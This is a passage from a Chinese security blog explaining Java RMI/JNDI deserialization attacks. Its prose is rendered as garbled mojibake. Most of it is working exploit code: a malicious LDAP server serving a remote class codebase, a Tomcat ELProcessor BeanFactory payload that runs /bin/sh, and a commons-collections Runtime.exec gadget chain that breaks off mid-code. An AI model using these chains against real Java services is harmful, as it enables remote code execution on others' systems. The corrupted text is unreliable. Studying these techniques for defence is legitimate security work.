<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">HelloService</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    String <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">HelloService</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">HelloServiceImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>å¯åŠ¨äº†ä¸€ä¸ª1099ç«¯å£çš„Registryæ³¨å†ŒæœåŠ¡ï¼Œå¹¶æŠŠHelloServiceæ¥å£çš„å®ç°HelloServiceImplæš´éœ²å’Œæ³¨å†Œåˆ°Registryæ³¨å†ŒæœåŠ¡</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">      registry.bind(<span class="string">&quot;hello&quot;</span>, <span class="keyword">new</span> <span class="title class_">HelloServiceImpl</span>());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (AlreadyBoundException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>




<p>ç¨‹åºBï¼š</p>
<p>å…·æœ‰æ¥å£ç±»HelloService</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">HelloService</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    String <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>è¿æ¥Registryå¹¶lookupæŸ¥æ‰¾åˆ°åä¸ºhelloçš„å¯¹è±¡</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">            <span class="type">HelloService</span> <span class="variable">helloService</span> <span class="operator">=</span> (HelloService) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">            System.out.println(helloService.sayHello());</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<ul>
<li>å¯åŠ¨ç¨‹åºAåï¼Œå†å¯åŠ¨ç¨‹åºB</li>
</ul>
<p>åœ¨ä¸Šè¿°æ“ä½œåï¼Œæˆ‘ä»¬ä¼šå‘ç°ç¨‹åºAè¾“å‡ºäº†helloï¼Œå¹¶ä¸”ç¨‹åºBä¹Ÿè¾“å‡ºäº†helloã€‚åˆ°åº•æ€ä¹ˆå›äº‹å‘¢ï¼Ÿ</p>
<p>å…¶å®ï¼Œåœ¨ç¨‹åºAå¯åŠ¨çš„æ—¶å€™ï¼Œç¨‹åºAå¯åŠ¨äº†ä¸€ä¸ªRMIçš„æ³¨å†Œä¸­å¿ƒï¼Œæ¥ç€æŠŠHelloServiceImplæš´éœ²å¹¶æ³¨å†Œåˆ°RMIæ³¨å†Œä¸­å¿ƒï¼Œå…¶ä¸­å­˜å‚¨ç€HelloServiceImplçš„stubæ•°æ®ï¼ŒåŒ…å«æœ‰HelloServiceImplæ‰€åœ¨æœåŠ¡å™¨çš„ipå’Œportã€‚åœ¨ç¨‹åºBå¯åŠ¨ä¹‹åï¼Œé€šè¿‡è¿æ¥RMIæ³¨å†Œä¸­å¿ƒï¼Œå¹¶ä»å…¶ä¸­æ ¹æ®åç§°æŸ¥è¯¢åˆ°äº†å¯¹åº”çš„å¯¹è±¡ï¼ˆJNDIï¼‰ï¼Œå¹¶æŠŠå…¶æ•°æ®ä¸‹è½½åˆ°æœ¬åœ°ï¼Œç„¶åRMIä¼šæ ¹æ®stubå­˜å‚¨çš„ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯ç¨‹åºAä¸­HelloServiceImplå®ç°æš´éœ²çš„ipå’Œportï¼Œæœ€åé€šè¿‡JRMPåè®®å‘èµ·RMIè¯·æ±‚ï¼ŒRMIåï¼Œç¨‹åºAè¾“å‡ºhelloå¹¶é€šè¿‡JRMPåè®®æŠŠhelloçš„åºåˆ—åŒ–æ•°æ®è¿”å›ç»™ç¨‹åºBï¼Œç¨‹åºBå¯¹å…¶ååºåˆ—åŒ–åè¾“å‡ºã€‚</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage.png"></p>
<p>æ ¹æ®ä¸Šè¿°æ‰€è¯´çš„æµç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå¦‚æœè¦å‘èµ·ä¸€ä¸ªååºåˆ—åŒ–æ”»å‡»ï¼Œé‚£ä¹ˆæ—©åœ¨ç¨‹åºB lookupçš„æ—¶å€™ï¼Œå°±ä¼šä»Registryæ³¨å†Œä¸­å¿ƒä¸‹è½½æ•°æ®ï¼Œå‰é¢ä¹Ÿè¯´äº†â€œæœåŠ¡åç§°å’Œå¯¹è±¡æˆ–å‘½åå¼•ç”¨ç›¸å…³è”â€ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ç¨‹åºA bindæ³¨å†Œä¸€ä¸ªå‘½åå¼•ç”¨åˆ°Registryæ³¨å†Œä¸­å¿ƒï¼Œä¹Ÿå°±æ˜¯Referenceï¼Œå®ƒå…·æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œ<code>className</code>ã€<code>factory</code>ã€<code>classFactoryLocation</code>ï¼Œå½“ç¨‹åºB lookupå®ƒå¹¶ä¸‹è½½åˆ°æœ¬åœ°åï¼Œä¼šä½¿ç”¨<code>Reference</code>çš„<code>classFactoryLocation</code>æŒ‡å®šçš„åœ°å€å»ä¸‹è½½<code>className</code>æŒ‡å®š<code>class</code>æ–‡ä»¶ï¼Œæ¥ç€åŠ è½½å¹¶å®ä¾‹åŒ–ï¼Œä»è€Œåœ¨ç¨‹åºB lookupçš„æ—¶å€™å®ç°åŠ è½½è¿œç¨‹æ¶æ„classå®ç°RCEã€‚</p>
<p>æˆ‘ä»¬å†æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼š</p>
<ul>
<li>ç¨‹åºA</li>
</ul>
<p>åˆ›å»ºäº†ä¸€ä¸ªç«¯å£ä¸º1099çš„Registryæ³¨å†Œä¸­å¿ƒï¼Œå¹¶æ³¨å†Œäº†ä¸€ä¸ªReferenceåˆ°æ³¨å†Œä¸­å¿ƒï¼Œè¯¥Referenceå¼•ç”¨äº†ä¸€ä¸ª127.0.0.1ä¸­80ç«¯å£httpæœåŠ¡æä¾›çš„Calc.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App3</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;http://127.0.0.1:80/&quot;</span>);</span><br><span class="line">            <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">            registry.bind(<span class="string">&quot;hello&quot;</span>,referenceWrapper);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<ul>
<li>ç¨‹åºB</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InitialContext</span>().lookup(<span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>ç¨‹åºå¯åŠ¨åï¼Œå‘ç°æŠ¥é”™ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javax.naming.ConfigurationException: The object factory is untrusted. Set the system property <span class="string">&#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27;</span> to <span class="string">&#x27;true&#x27;</span>.</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>å› ä¸ºåœ¨jdk8u121ç‰ˆæœ¬å¼€å§‹ï¼ŒOracleé€šè¿‡é»˜è®¤è®¾ç½®ç³»ç»Ÿå˜é‡<code>com.sun.jndi.rmi.object.trustURLCodebase</code>ä¸º<strong>false</strong>ï¼Œå°†å¯¼è‡´é€šè¿‡<strong>rmiçš„æ–¹å¼åŠ è½½è¿œç¨‹çš„å­—èŠ‚ç ä¸ä¼šè¢«ä¿¡ä»»</strong>ï¼Œæƒ³è¦ç»•è¿‡æœ‰ä¸¤ç§æ–¹å¼ï¼š</p>
<ol>
<li>ä½¿ç”¨ldapæœåŠ¡å–ä»£rmiæœåŠ¡ï¼ˆåœ¨jdk8u191å¼€å§‹ï¼Œå¼•å…¥JRP290ï¼ŒåŠ å…¥äº†ååºåˆ—åŒ–ç±»è¿‡æ»¤ï¼‰ï¼š</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * LDAP server</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> threedr3am</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapServer</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    run();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line">    <span class="comment">//TODO æŠŠresourcesä¸‹çš„Calc.class æˆ–è€… è‡ªå®šä¹‰ä¿®æ”¹ç¼–è¯‘åtargetç›®å½•ä¸‹çš„Calc.class æ‹·è´åˆ°ä¸‹é¢ä»£ç æ‰€ç¤ºhttp://host:portçš„webæœåŠ¡å™¨æ ¹ç›®å½•å³å¯</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://localhost/#Calc&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">      config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">          <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">          InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">          port,</span><br><span class="line">          ServerSocketFactory.getDefault(),</span><br><span class="line">          SocketFactory.getDefault(),</span><br><span class="line">          (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">      config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));</span><br><span class="line">      <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">      System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">      ds.startListening();</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span><span class="params">(URL cb)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span><span class="params">(InMemoryInterceptedSearchResult result)</span> &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">      <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        sendResult(result, base, e);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e1) &#123;</span><br><span class="line">        e1.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span><span class="params">(InMemoryInterceptedSearchResult result, String base, Entry e)</span></span><br><span class="line">        <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">      <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;&quot;</span>));</span><br><span class="line">      System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">      e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">      <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">      <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (refPos &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">      &#125;</span><br><span class="line">      e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">      e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">      e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">      result.sendSearchEntry(e);</span><br><span class="line">      result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<ol>
<li>ä½¿ç”¨tomcat-elåˆ©ç”¨é“¾ï¼š</li>
</ol>
<p>PSï¼šä½¿ç”¨è¿™ç§æ–¹å¼ï¼Œéœ€è¦lookupçš„å®¢æˆ·ç«¯å­˜åœ¨ä»¥ä¸‹ä¾èµ–</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;tomcat-embed-el&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;<span class="number">8.5</span><span class="number">.15</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>


<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>,<span class="literal">null</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">            <span class="comment">//redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span></span><br><span class="line">            resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">            <span class="comment">//expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span></span><br><span class="line">            resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line"></span><br><span class="line">            <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(resourceRef);</span><br><span class="line">            registry.bind(<span class="string">&quot;hello&quot;</span>,referenceWrapper);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="2-2-ä¸ºä»€ä¹ˆRegistry-bindæš´éœ²ä¸€ä¸ªæœåŠ¡å¯¹è±¡åˆ°RmiRegistryä¼šå¯¼è‡´RegistryæœåŠ¡è‡ªèº«è¢«ååºåˆ—åŒ–RCE"><a href="#2-2-ä¸ºä»€ä¹ˆRegistry-bindæš´éœ²ä¸€ä¸ªæœåŠ¡å¯¹è±¡åˆ°RmiRegistryä¼šå¯¼è‡´RegistryæœåŠ¡è‡ªèº«è¢«ååºåˆ—åŒ–RCE" class="headerlink" title="2.2 ä¸ºä»€ä¹ˆRegistry bindæš´éœ²ä¸€ä¸ªæœåŠ¡å¯¹è±¡åˆ°RmiRegistryä¼šå¯¼è‡´RegistryæœåŠ¡è‡ªèº«è¢«ååºåˆ—åŒ–RCE"></a>2.2 ä¸ºä»€ä¹ˆRegistry bindæš´éœ²ä¸€ä¸ªæœåŠ¡å¯¹è±¡åˆ°RmiRegistryä¼šå¯¼è‡´RegistryæœåŠ¡è‡ªèº«è¢«ååºåˆ—åŒ–RCE</h2><p>æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸ªä¾‹å­ï¼š</p>
<ul>
<li>ç¨‹åºA  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>ç¨‹åºAåˆ›å»ºäº†ä¸€ä¸ª1099ç«¯å£çš„Registryæ³¨å†Œä¸­å¿ƒ</p>
<ul>
<li>ç¨‹åºB  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">ouputMap</span> 